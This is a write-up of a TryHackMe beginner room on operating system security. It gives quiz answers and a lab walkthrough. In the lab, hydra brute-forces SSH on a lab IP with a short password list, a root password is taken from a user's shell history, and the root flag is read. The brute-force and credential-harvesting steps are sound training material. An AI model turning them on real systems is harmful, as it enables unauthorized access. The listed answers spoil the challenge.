---
description: https://tryhackme.com/room/operatingsystemsecurity
---

# Operating System Security

## Task 1 Introduction to Operating System Security

#### Which of the following is **not** an operating system?

* AIX
* Android
* Chrome OS
* Solaris
* Thunderbird

{% hint style="success" %}
`Thunderbird`
{% endhint %}

## Task 2 Common Examples of OS Security

1. Authentication and Weak Passwords
2. Weak File Permissions
3. Malicious Program

#### Which of the following is a strong password, in your opinion?

* iloveyou
* 1q2w3e4r5t
* LearnM00r
* qwertyuiop

{% hint style="success" %}
`LearnM00r`
{% endhint %}

## Task 3 Practical Example of OS Security

#### Based on the top 7 passwords, let’s try to find Johnny’s password. What is the password for the user `johnny`?

```bash
echo 'johnny\nlinda' > user.txt
echo '123456\n123456789\nqwerty\npassword\n111111\n12345678\nabc123' > pass.txt
hydra -L user.txt -P pass.txt ssh://10.10.187.109
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 06-52-03.png>)

{% hint style="success" %}
`abc123`
{% endhint %}

#### Once you are logged in as Johnny, use the command `history` to check the commands that Johnny has typed. We expect Johnny to have mistakenly typed the `root` password instead of a command. What is the root password?

```bash
ssh johnny@10.10.187.109
history
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 06-53-38.png>)

{% hint style="success" %}
`happyHack!NG`
{% endhint %}

#### While logged in as Johnny, use the command `su - root` to switch to the `root` account. Display the contents of the file `flag.txt` in the `root` directory. What is the content of the file?

```bash
su -
cat flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 06-54-16.png>)

{% hint style="success" %}
`THM{YouGotRoot}`
{% endhint %}
